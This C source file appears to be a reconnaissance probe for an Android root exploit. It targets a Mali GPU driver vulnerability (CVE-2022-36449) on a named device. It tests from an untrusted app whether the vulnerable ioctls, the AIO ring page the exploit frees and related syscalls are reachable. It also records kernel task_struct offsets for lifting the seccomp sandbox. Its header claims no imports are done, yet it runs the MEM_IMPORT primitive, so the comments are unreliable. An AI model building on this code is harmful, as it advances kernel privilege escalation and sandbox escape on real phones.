// Gate check for a standalone root APK on chiron (Android 11, 5.4.125).
//
// Answers two questions that decide whether an app (untrusted_app domain,
// seccomp-filtered) can run the CVE-2022-36449 primitive at all:
//   1. can it open /dev/mali0 and issue kbase ioctls?
//   2. is io_setup() (the AIO ring page the exploit frees) allowed by the
//      app seccomp filter?
//
// Nothing is exploited here: no imports, no writes, no credentials touched.
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#define KBASE_IOCTL_TYPE 0x80
struct kbase_ioctl_version_check {
  uint16_t major;
  uint16_t minor;
};
struct kbase_ioctl_set_flags {
  uint32_t create_flags;
};
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
/* NOTE: VERSION_CHECK is _IOWR (the driver writes the version back). */
#define KBASE_IOCTL_VERSION_CHECK \
  _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)

struct base_mem_import_user_buffer {
  uint64_t ptr;
  uint64_t length;
};
/* Vendor r25p0 layout: it is a UNION, 24 bytes total. Declaring it as a
 * struct gives sizeof 48 and an ioctl number the driver does not know. */
union kbase_ioctl_mem_import {
  struct { uint64_t flags, phandle; uint32_t type, padding; } in;
  struct { uint64_t flags, gpu_va, va_pages; } out;
};
#define KBASE_IOCTL_MEM_IMPORT _IOWR(0x80, 22, union kbase_ioctl_mem_import)
#define BASE_MEM_IMPORT_TYPE_USER_BUFFER 3
#define BASE_MEM_PROT_CPU_RD 0x1u
#define BASE_MEM_PROT_GPU_RD 0x2u
#define BASE_MEM_PROT_CPU_WR 0x4u
#define BASE_MEM_CACHED_CPU 0x8u

union kbase_ioctl_mem_query {
  struct { uint64_t gpu_addr, query; } in;
  struct { uint64_t value; } out;
};
#define KBASE_IOCTL_MEM_QUERY _IOWR(0x80, 6, union kbase_ioctl_mem_query)
#define KBASE_MEM_QUERY_COMMIT_SIZE 1ULL

#ifndef __NR_io_setup
#define __NR_io_setup 0
#endif

static char out[4096];

static void add(const char *fmt, ...) {
  va_list ap;
  size_t n = strlen(out);
  va_start(ap, fmt);
  vsnprintf(out + n, sizeof(out) - n, fmt, ap);
  va_end(ap);
}

const char *mali_jm_probe(void) {
  out[0] = 0;

  add("uid=%d euid=%d pid=%d\n", (int)getuid(), (int)geteuid(), (int)getpid());

  // 1. GPU device reachability
  int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
  add("open(/dev/mali0) = %d errno=%d (%s)\n", fd, fd < 0 ? errno : 0,
      fd < 0 ? strerror(errno) : "ok");

  if (fd >= 0) {
    struct kbase_ioctl_version_check ver = {11, 21};
    int rc = ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &ver);
    add("VERSION_CHECK rc=%d errno=%d api=%u.%u\n", rc, rc < 0 ? errno : 0,
        ver.major, ver.minor);

    struct kbase_ioctl_set_flags flags = {0};
    errno = 0;
    int rc2 = ioctl(fd, KBASE_IOCTL_SET_FLAGS, &flags);
    add("SET_FLAGS rc=%d errno=%d (%s)\n", rc2, rc2 < 0 ? errno : 0,
        rc2 < 0 ? strerror(errno) : "ok");
    close(fd);
  }

  // 1b. is ioctl() itself filtered?
  {
    int devnull = open("/dev/null", O_RDONLY);
    errno = 0;
    int r1 = ioctl(devnull, 0x1234, 0);           /* bogus cmd */
    add("ioctl(/dev/null, bogus) = %d errno=%d (%s)\n", r1,
        r1 < 0 ? errno : 0, r1 < 0 ? strerror(errno) : "ok");
    close(devnull);

    int mfd2 = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    errno = 0;
    int r2 = ioctl(mfd2, 0x1234, 0);              /* bogus cmd on mali */
    add("ioctl(mali, bogus) = %d errno=%d (%s)\n", r2,
        r2 < 0 ? errno : 0, r2 < 0 ? strerror(errno) : "ok");
    close(mfd2);
  }

  // 1c. the primitive itself: import a user buffer as GPU memory
  {
    int mfd3 = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (mfd3 >= 0) {
      struct kbase_ioctl_version_check v2 = {11, 21};
      ioctl(mfd3, KBASE_IOCTL_VERSION_CHECK, &v2);
      struct kbase_ioctl_set_flags f2 = {0};
      ioctl(mfd3, KBASE_IOCTL_SET_FLAGS, &f2);

      void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
      struct base_mem_import_user_buffer ub = {(uint64_t)(uintptr_t)page, 4096};
      union kbase_ioctl_mem_import mi;
      memset(&mi, 0, sizeof mi);
      mi.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                    BASE_MEM_PROT_CPU_WR | BASE_MEM_CACHED_CPU;
      mi.in.phandle = (uint64_t)(uintptr_t)&ub;
      mi.in.type = BASE_MEM_IMPORT_TYPE_USER_BUFFER;
      errno = 0;
      int r = ioctl(mfd3, KBASE_IOCTL_MEM_IMPORT, &mi);
      add("MEM_IMPORT cmd=0x%lx sizeof=%zu\n",
          (unsigned long)KBASE_IOCTL_MEM_IMPORT, sizeof(union kbase_ioctl_mem_import));
      add("MEM_IMPORT rc=%d errno=%d (%s) gpu_va=0x%llx\n", r,
          r < 0 ? errno : 0, r < 0 ? strerror(errno) : "ok",
          (unsigned long long)mi.out.gpu_va);
      if (r == 0) {
        union kbase_ioctl_mem_query q;
        memset(&q, 0, sizeof q);
        q.in.gpu_addr = mi.out.gpu_va;
        q.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
        errno = 0;
        int rq = ioctl(mfd3, KBASE_IOCTL_MEM_QUERY, &q);
        add("MEM_QUERY(commit) rc=%d errno=%d commit=%llu\n", rq,
            rq < 0 ? errno : 0, (unsigned long long)q.out.value);
      }
      close(mfd3);
    }
  }

  // 1d. what domain are we in, and may we load modules?
  {
    char ctx[128] = {0};
    int cf = open("/proc/self/attr/current", O_RDONLY);
    if (cf >= 0) {
      int n = (int)read(cf, ctx, sizeof(ctx) - 1);
      if (n > 0) ctx[n] = 0;
      close(cf);
    }
    add("domain=%s", ctx[0] ? ctx : "?");

    /* init_module is NOT called here on purpose: the app seccomp filter answers
     * it with SIGSYS (kills the process), not with an errno. Verified once:
     *   Fatal signal 31 (SIGSYS), code 1 (SYS_SECCOMP)
     * task_struct offsets that matter for lifting it (vendor binary):
     *   seccomp.mode   @ 0x770
     *   seccomp.filter @ 0x778
     */
    add("init_module: blocked by seccomp (SIGSYS), not by SELinux\n");
  }

  // 2. AIO ring page, the page the primitive frees
  unsigned long ctx = 0;
  errno = 0;
  long aio = syscall(__NR_io_setup, 128, &ctx);
  add("io_setup(128) = %ld errno=%d (%s)\n", aio, aio < 0 ? errno : 0,
      aio < 0 ? strerror(errno) : "ok");
  if (aio == 0) {
    errno = 0;
    long d = syscall(__NR_io_destroy, ctx);
    add("io_destroy = %ld errno=%d\n", d, d < 0 ? errno : 0);
  }

  // 3. Other syscalls the exploit path needs
  errno = 0;
  int mfd = (int)syscall(__NR_memfd_create, "x", 0);
  add("memfd_create = %d errno=%d\n", mfd, mfd < 0 ? errno : 0);
  if (mfd >= 0) close(mfd);

  return out;
}
